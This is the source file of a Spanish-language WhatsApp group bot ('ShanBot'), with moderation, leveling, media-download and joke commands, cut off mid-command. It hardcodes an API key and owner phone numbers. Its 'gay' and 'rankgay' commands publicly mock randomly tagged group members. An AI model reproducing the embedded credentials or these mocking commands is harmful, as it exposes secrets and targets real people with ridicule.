 /*
* ShanBot es una creación de shanduy
* ShanBot no tiene ningun fin de lucro
* shanduy se reserva todos los derechos de autor
* © 2021 shanduy, INC.

Cualquier copia que utilize mi ApiKey sera dado de baja

- Que hay de nuevo?
* Nada
*/

const {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    rugaapi,
    GroupSettingChange
} = require('@adiwajshing/baileys')

/******COMIENZO DE LA ENTRADA DEL ARCHIVO******/
const { color, bgcolor } = require('./lib/color')
const { bahasa } = require('./src/bahasa')
const { negara } = require('./src/kodenegara')
const { virtex } = require('./src/virtex')
const { wait, pegatinas, musica, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { fetchJson } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
/******FIN DE ENTRADA DE ARCHIVO******/

/******COMIENZO DE LA ENTRADA DEL PAQUETE NPM******/
const fs = require('fs')
const moment = require('moment-timezone')
const { exec } = require('child_process')
const kagApi = require('@kagchi/kag-api')
const fetch = require('node-fetch')
/*const tiktod = require('tiktok-scraper')*/
const ffmpeg = require('fluent-ffmpeg')
const { removeBackgroundFromImageFile } = require('remove.bg')
const imgbb = require('imgbb-uploader')
const lolis = require('lolis.life')
const loli = new lolis()
const speed = require('performance-now')
/******FIN DE ENTRADA DEL PAQUETE NPM******/

/******COMIENZO DE LA ENTRADA JSON******/
const welkom = JSON.parse(fs.readFileSync('./database/json/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./database/json/nsfw.json'))
const samih = JSON.parse(fs.readFileSync('./database/json/simi.json'))
const user = JSON.parse(fs.readFileSync('./database/json/user.json'))
const _leveling = JSON.parse(fs.readFileSync('./database/json/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./database/json/level.json'))
/******FIN DE ENTRADA JSON******/

/******INICIO DE LA ENTRADA DEL MENÚ******/
const { help } = require('./src/help')
const { logomaker } = require('./database/menu/logomaker')
const { toinmenu } = require('./src/toinmenu')
const { menuadmin } = require('./src/menuadmin')
const { nsfwmenu } = require('./src/nsfwmenu')
const { desmenu } = require('./src/desmenu')
const { version } = require('./src/version')
const { menubinner } = require('./src/menubinner')
const { shantera } = require('./src/shantera')
const { welmenu } = require('./src/welmenu')
/*const { mediamenu } = require('./database/menu/mediamenu')
const { educationmenu } = require('./database/menu/educationmenu')
const { downloadermenu } = require('./database/menu/downloadermenu')
const { mememenu } = require('./database/menu/mememenu')
const { kerangmenu } = require('./database/menu/kerangmenu')
const { groupmenu } = require('./database/menu/groupmenu')
const { soundmenu } = require('./database/menu/soundmenu')
const { musicmenu } = require('./database/menu/musicmenu')
const { islammenu } = require('./database/menu/islammenu')
const { stalkmenu } = require('./database/menu/stalkmenu')
const { wibumenu } = require('./database/menu/wibumenu')
const { funmenu } = require('./database/menu/funmenu')
const { informationmenu } = require('./database/menu/informationmenu')
const { 18+menu } require('./database/menu/18+menu')
const { ownermenu } require('./database/menu/ownermenu')
const { othermenu } require('./database/menu/othermenu')*/
/******FIN DE ENTRADA DEL MENÚ******/

/******CARGA DE ENTRADA VCARD******/
const vcard = 'BEGIN:VCARD\n' // Tarjeta de contacto
            + 'VERSION:3.0\n' 
            + 'FN:Joseph\n' // Nombre
            + 'ORG:Joseph;\n' // Propietario
            + 'TEL;type=CELL;type=VOICE;waid=58269240516:+58 269-2404516\n' // ID de WhatsApp + número de teléfono
            + 'END:VCARD'
/******FIN DE ENTRADA VCARD******/

prefix = '/'
blocked = []

/******CONFIGURACION DE CARGA******/
const settingan = JSON.parse(fs.readFileSync('./admin/set.json'))
const {
	author,
	pack
} = settingan

/******INICIO DE FUNCIONES ENTRADA******/

/******ARCHIVOS ANTILINK POR SHANDUY******/
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))

/******FIN DE ARCHIVOS ANTILINK POR SHANDUY******/

const getLevelingXp = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }
	
const getLevelingId = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].jid
            }
        }

        const addLevelingXp = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/json/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/json/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (userId) => {
            const obj = {jid: userId, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/json/level.json', JSON.stringify(_level))
        }

function addMetadata(packname, author) {	
	if (!packname) packname = 'Made In'; if (!author) author = 'Bineria Universal';	
	author = author.replace(/[^a-zA-Z0-9]/g, '');	
	let name = `${author}_${packname}`
	if (fs.existsSync(`./${name}.exif`)) return `./${name}.exif`
	const json = {	
		"sticker-pack-name": packname,
		"sticker-pack-publisher": author,
	}
	const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
	const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

	let len = JSON.stringify(json).length	
	let last	

	if (len > 256) {	
		len = len - 256	
		bytes.unshift(0x01)	
	} else {	
		bytes.unshift(0x00)	
	}	

	if (len < 16) {	
		last = len.toString(16)	
		last = "0" + len	
	} else {	
		last = len.toString(16)	
	}	

	const buf2 = Buffer.from(last, "hex")	
	const buf3 = Buffer.from(bytes)	
	const buf4 = Buffer.from(JSON.stringify(json))	

	const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

	fs.writeFile(`./${name}.exif`, buffer, (err) => {	
		return `./${name}.exif`	
	})	

} 
	
function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${pad(hours)} Horas ${pad(minutes)} Minutos ${pad(seconds)} Segundos`
}

async function starts() {
	const client = new WAConnection()
	client.version = [2, 2119, 6]
        client.logger.level = 'warn'
	console.log(banner.string)
	client.on('qr', () => {
		console.log(color('[','white'), color('!','red'), color(']','white'), color(' Escanea el codigo QR rapido!!!  '))
	})

	fs.existsSync('./Nazwa.json') && client.loadAuthInfo('./Nazwa.json')
	client.on('connecting', () => {
		start('2', 'Desconectado')
	})
	client.on('open', () => {
		success('2', 'Conectado by shanduy')
	})
	await client.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./Nazwa.json', JSON.stringify(client.base64EncodedAuthInfo(), null, '\t'))

	client.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			const mdata = await client.groupMetadata(anu.jid)
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				teks = `Hola @${num.split('@')[0]}\nBienvenid@ a *${mdata.subject}* Gracias por unirte a la familia 🤗\n\nPara utilizar el bot registrate con el comando ${prefix}daftar y tu nombre\n\nPara ver los demas comandos utiliza ${prefix}help\n\nOjito con el spam ☠\n\n`
                          client.sendMessage(mdata.id, teks, MessageType.text, { contextInfo: {"mentionedJid": [num]}})
			} else if (anu.action == 'remove') {
				num = anu.participants[0]
				teks = `ADIOS @${num.split('@')[0]}👋\n\nNadie te extrañará kk`
				client.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}})
			}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})

		client.on('CB:Blocklist', json => {
            if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})

	client.on('chat-update', async (mek) => {
		try {
                        if (!mek.hasNewMessage) return
                        mek = JSON.parse(JSON.stringify(mek)).messages[0]
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			if (mek.key.fromMe) return
			global.prefix
			global.blocked
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const time = moment.tz('America/Guayaquil').format('HH:mm:ss')
			const date = moment.tz('America/Guayaquil').format('DD/MM/YY')
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			let authorname = client.contacts[from] != undefined ? client.contacts[from].vname || client.contacts[from].notify : undefined
			const isCmd = body.startsWith(prefix)

			mess = {
				wait: '❬ ESPERA ❭ ᴜɴ ᴍᴏᴍᴇɴᴛᴏ :3',
				success: '✔️ Listo ✔️',
                                levelon: '❬ ✅ ❭ *Level activado*',
				leveloff: ' ❬ ✅ ❭  *Level desactivado*',
				levelnoton: '❬ ❎ ❭ *Level no esta activado*',
				levelnol: '*Nivel* 0 ',
				error: {
					stick: '[❎] Falló, se produjo un error al convertir la imagen en una pegatina',
					Iv: '❌ Link inválido ❌'
				},
				only: {
					group: '[❗] ᴇsᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴘᴜᴇᴅᴇ sᴇʀ ᴜsᴀᴅᴏ ᴇɴ ɢʀᴜᴘᴏs [❌]',
					ownerG: '[❗] ᴇsᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴘᴜᴇᴅᴇ sᴇʀ ᴜsᴀᴅᴏ ᴘᴏʀ ᴇʟ ᴘʀᴏᴘɪᴇᴛᴀʀɪᴏ ᴅᴇʟ ɢʀᴜᴘᴏ [❌]',
					ownerB: '[❗] ᴇsᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sʟᴏ ᴘᴜᴇᴅᴇ sᴇʀ ᴜsᴀᴅᴏ ᴘᴏʀ ᴍɪ ᴄʀᴇᴀᴅᴏʀ [❌]',
					admin: '[❌] ᴇsᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴘᴜᴇᴅᴇ sᴇʀ ᴜsᴀᴅᴏ ᴘᴏʀ ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs ᴅᴇʟ ɢʀᴜᴘᴏ [❌]',
					Badmin: '[❌] ᴇsᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴘᴜᴇᴅᴇ sᴇʀ ᴜsᴀᴅᴏ ᴄᴜᴀɴᴅᴏ ᴇʟ ʙᴏᴛ sᴇ ᴛᴏʀɴᴀ ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀ [❌]',
                                        pegatina: '❬ ESPERA ❭ ᴜɴ ᴍᴏᴍᴇɴᴛᴏ :3',
					attp: '❬ ESPERA ❭ ᴜɴ ᴍᴏᴍᴇɴᴛᴏ :3',
					imgs: '❬ ESPERA ❭ ᴜɴ ᴍᴏᴍᴇɴᴛᴏ :3',
					mpcancion: '❬ ESPERA ❭ ᴜɴ ᴍᴏᴍᴇɴᴛᴏ :3',
					mpa: '❬ ESPERA ❭ ᴜɴ ᴍᴏᴍᴇɴᴛᴏ :3',
                                        xn: '❬ ESPERA ❭ ᴜɴ ᴍᴏᴍᴇɴᴛᴏ :3',
					mpv: '❬ ESPERA ❭ ᴜɴ ᴍᴏᴍᴇɴᴛᴏ :3',
					insta: '❬ ESPERA ❭ ᴜɴ ᴍᴏᴍᴇɴᴛᴏ :3',
					musica: '❬ ESPERA ❭ ᴜɴ ᴍᴏᴍᴇɴᴛᴏ :3',
					musica2: '❬ ESPERA ❭ ᴜɴ ᴍᴏᴍᴇɴᴛᴏ :3',
					daftarB: `Hola, al parecer no estas registrado en mi base de datos\n\nPara poder usarme escribe el siguente comando\n\nComando: ${prefix}daftar Nombre\nEjemplo: ${prefix}daftar Joseph`,
				}
			}
    			const apakah = ['Si','No']
                        const kapankah = ['Otro día','Otra semana','Otro mes','Otro año']
			const botNumber = client.user.jid
			const ownerNumber = ["51961361181@s.whatsapp.net"] // replace this with your number
			const nomorOwner = [ownerNumber]
	                const isGroup = from.endsWith('@g.us')
			const totalchat = await client.chats.all()
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const isAntiLink = isGroup ? antilink.includes(from) : false
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
                        const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : false
			const isSimi = isGroup ? samih.includes(from) : false
			const isOwner = ownerNumber.includes(sender)
                        const isUser = user.includes(sender)
                        const isLevelingOn = isGroup ? _leveling.includes(groupId) : false
                        const NomerOwner = '51961361181@s.whatsapp.net'
                        /******Entrada ApiKey******/
                        const BarBarKey = 'Mn2Bf58QHQ8kABoLq80g'
                        /******Fin de la entrada de ApiKey******/

			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				client.sendMessage(from, teks, text, {quoted:mek})
			}
			const sendMess = (hehe, teks) => {
				client.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? client.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}
           //FUNCION ANTILINK
	        if (budy.includes("://chat.whatsapp.com/")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply('Eres un administrador del grupo, así que no te prohibiré el uso de enlaces :)')
		client.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Link Detectado ${sender.split("@")[0]} Usted será expulsado del grupo`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 0)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Adios ojala nunca regreses 😂👋")
		}, 0)
	}
		
		//FUNCION DE LEVEL
            if (isGroup && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 500
                const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    await reply(`*「 LEVEL UP 」*\n\n➸ *Nombre*: ${sender}\n➸ *XP*: ${getLevelingXp(sender)}\n➸ *Level*: ${getLevel} -> ${getLevelingLevel(sender)}\n\nFelicidades!! 🎉🎉`)
                }
            } catch (err) {
                console.error(err)
            }
        }

			colors = ['red','white','black','blue','yellow','green']
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
 
       /******ENTRADA FIN DE FUNCIONES******/
			function addMetadata(packname, author) {	
				if (!packname) packname = 'Made In'; if (!author) author = 'Bineria Universal';	
				author = author.replace(/[^a-zA-Z0-9]/g, '');	
				let name = `${author}_${packname}`
				if (fs.existsSync(`./src/stickers/${name}.exif`)) return `./src/stickers/${name}.exif`
				const json = {	
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

				let len = JSON.stringify(json).length	
				let last	

				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)	
				} else {	
					bytes.unshift(0x00)	
				}	

				if (len < 16) {	
					last = len.toString(16)	
					last = "0" + len	
				} else {	
					last = len.toString(16)	
				}	

				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	

				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

				fs.writeFile(`./src/stickers/${name}.exif`, buffer, (err) => {	
					return `./src/stickers/${name}.exif`	
				})	

			}
			switch(command) {
		case 'help':
		case 'menu':   
                client.sendMessage(from, help(prefix, sender), text, {quoted: mek})
		break
                case 'otak':
		client.sendMessage(from, otak(prefix, sender), text, {quoted: mek})
		break
		case 'juegos':
		client.sendMessage(from, juegos(prefix, sender), text, {quoted: mek})
		break
		case 'idioma':
		client.sendMessage(from, bahasa(prefix, sender), text, {quoted: mek})
		break
		case 'shanmenu':
		client.sendMessage(from, toinmenu(prefix, sender), text, {quoted: mek})
		break
		case 'menuadmin':
		client.sendMessage(from, menuadmin(prefix, sender), text, {quoted: mek})
		break
		case 'nsfwmenu':
		client.sendMessage(from, nsfwmenu(prefix, sender), text, {quoted: mek})
		break
		case 'desmenu':
		client.sendMessage(from, desmenu(prefix, sender), text, {quoted: mek})
		break
		case 'versión':
		case 'version':
		client.sendMessage(from, version(prefix, sender), text, {quoted: mek})
		break
		case 'antimenu':
		client.sendMessage(from, antimenu(prefix, sender), text, {quoted: mek})
		break
                case 'welmenu':
		client.sendMessage(from, welmenu(prefix, sender), text, {quoted: mek})
		break
		case 'shantera':
		client.sendMessage(from, shantera(prefix, sender), text, {quoted: mek})
		break
					
		/*case 'virtex':
	       case 'troleo':
               client.sendMessage(from, traba(prefix, sender), text, {quoted: mek})
               break*/
                            case 'demote':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('La etiqueta de destino que el administrador quiere transmitir')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `Pedido recibido✅\n\nRetirando cargo como administrador :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						client.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`Pedido recibido✅\n\nRetirando cargo como administrador @${mentioned[0].split('@')[0]}\n*${groupMetadata.subject}*_`, mentioned, true)
						client.groupDemoteAdmin(from, mentioned)
					}
					break
                 case 'promote':
					client.updatePresence(from, Presence.composing) 
                                        if (!isUser) return reply(mess.only.daftarB)
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('¡La etiqueta de destino que desea promocionar!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Pedido recibido✅\n\nAgregando cargo como administrador :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						client.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`Pedido recibido✅\n\nAgregando cargo como administrador : @${mentioned[0].split('@')[0]}`, mentioned, true)
						client.groupMakeAdmin(from, mentioned)
					}
					break
/******JUEGOS SHANDUY LA PUTA MADRE NO TE OLVIDES******/
					
case 'gay':
if (!isUser) return reply(mess.only.daftarB)
rate = body.slice(5)
client.updatePresence(from, Presence.composing) 
random = `${Math.floor(Math.random() * 100)}`
gay = random
if (gay < 20 ) {ga = 'Usted es hetero 🤪🤙'} else if (gay == 21 ) {ga = 'Mas o menos 🤔'} else if (gay == 23 ) {ga = 'Mas o menos 🤔'} else if (gay == 24 ) {ga = 'Mas o menos 🤔'} else if (gay == 25 ) {ga = 'Mas o menos 🤔'} else if (gay == 26 ) {ga = 'Mas o menos 🤔'} else if (gay == 27 ) {ga = 'Mas o menos 🤔'} else if (gay == 28 ) {ga = 'Mas o menos 🤔'} else if (gay == 29 ) {ga = 'Mas o menos 🤔'} else if (gay == 30 ) {ga = 'Mas o menos 🤔'} else if (gay == 31 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 32 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 33 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 34 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 35 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 36 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 37 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 38 ) {ga = 'TTengo mi dudas 😑'} else if (gay == 39 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 40 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 41 ) {ga = 'Tengo razon? 😏'} else if (gay == 42 ) {ga = 'Tengo razon? 😏'} else if (gay == 43 ) {ga = 'Tengo razon? 😏'} else if (gay == 44 ) {ga = 'Tengo razon? 😏'} else if (gay == 45 ) {ga = 'Tengo razon? 😏'} else if (gay == 46 ) {ga = 'Tengo razon? 😏'} else if (gay == 47 ) {ga = 'Tengo razon? 😏'} else if (gay == 48 ) {ga = 'Tengo razon? 😏'} else if (gay == 49 ) {ga = 'Tengo razon? 😏'} else if (gay == 50 ) {ga = 'Eres o no? 🧐'} else if (gay > 51) {ga = 'Usted es gay 🥸'}
hasil = `${rate}Usted es ${random}% gay\n\n${ga}`
reply(hasil)
break

case 'cuties':
if (!isUser) return reply(mess.only.daftarB)
rate = body.slice(9)
client.updatePresence(from, Presence.composing) 
random = `${Math.floor(Math.random() * 100)}`
cuties = random
if (cuties < 20 ) {cu = 'Mi loco usted va para el cielo 👏'} else if (cuties == 21 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 23 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 24 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 25 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 26 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 27 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 28 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 29 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 30 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 31 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 32 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 33 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 34 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 35 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 36 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 37 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 38 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 39 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 40 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 41 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 42 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 43 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 44 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 45 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 46 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 47 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 48 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 49 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 50 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties > 51) {cu = 'Señores un autentico FAN DE CUTIES esta en el grupo 🥸'}
hasil = `${rate}Resultado ${random}% fan de cuties\n\n${cu}`
reply(hasil)
break
				  
case 'rankgay':
try{
if (!isUser) return reply(mess.only.daftarB)
if (!isGroup) return reply(mess.only.group)
d = []
teks = 'Top 5 de los mas gays del grupo\n\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `➔ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Hubo un error intentalo nuevamente :/')
}
break				
				
	
				  
       				case 'wa.me':
				  case 'wame':
  client.updatePresence(from, Presence.composing) 
      options = {
          text: `「 *LINK WHATSAPP* 」\n\n_Solicitado por_ : *@${sender.split("@s.whatsapp.net")[0]}\n\nSu link de Whatsapp : *https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*O ( / )*\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
          contextInfo: { mentionedJid: [sender] }
    }
    client.sendMessage(from, options, text, { quoted: mek } )
				break
				if (data.error) return reply(data.error)
				reply(data.result)
				break
		/*case 'tneon':
                data = await await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=tshanduyx&text=${body.slice(8)}`)
                if (!isUser) return reply(mess.only.daftarB)
                client.sendMessage(from, data, image, {quoted: mek, caption: body.slice(8)})
                break*/
	case 'creador':
	    case 'owner':
                case 'creator':
                client.sendMessage(from, {displayname: "Joseph", vcard: vcard}, MessageType.contact, { quoted: mek})
		client.sendMessage(from, 'Arriba está el número del creador del bot Joseph :)',MessageType.text, { quoted: mek} )
                break
	case 'kickmenu':
                client.sendMessage(from, '*Comando De Banear 📤*\n\nPara usar esta funcion el bot necesita admin\n\nComando: *kick + la personas que deseas eliminar\n\nEjemplo: *kick @xxxxxx\n\n*⚠ADVERTENCIA⚠*\nNUNCA COLOCAR MAS DE DOS PERSONAS PARA QUE LAS ELIMINE\n\nEjemplo: *kick @xxxxxx @xxxxx\n\nYa que el numero del bot se ira a soporte\n\nQuedas advertido :)\n\nву ѕнαη∂υу',MessageType.text, { quoted: mek} )
               break
	case 'hidetag':
                client.updatePresence(from, Presence.composing) 
                if (!isUser) return reply(mess.only.daftarB)
                if (!isGroup) return reply(mess.only.group)
                teks = body.slice(9)
                group = await client.groupMetadata(from);
                member = group['participants']
                jids = [];
                member.map( async adm => {
                jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
                 })
                 options = {
                 text: teks,
                contextInfo: {mentionedJid: jids},
                quoted: mek
                }
              await client.sendMessage(from, options, text)
               break
                                case 'ytmp3':
					if (args.length < 1) return reply('Donde esta la URL?')
					if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
					reply(mess.only.mpa)
					anu = await fetchJson(`https://st4rz.herokuapp.com/api/yta2?url=${args[0]}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					teks = `*DESCARGA EXITOSA ✅*\n◉ *Título* : ${anu.title}\n\n*ESPERE ENVIANDO SU ARCHIVO MP3 ⚠*`
					thumb = await getBuffer(anu.thumb)
					client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: mek})
					break
				case 'ytmp4':
					if (args.length < 1) return reply('Donde esta la URL?')
					if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
					reply(mess.only.mpv)
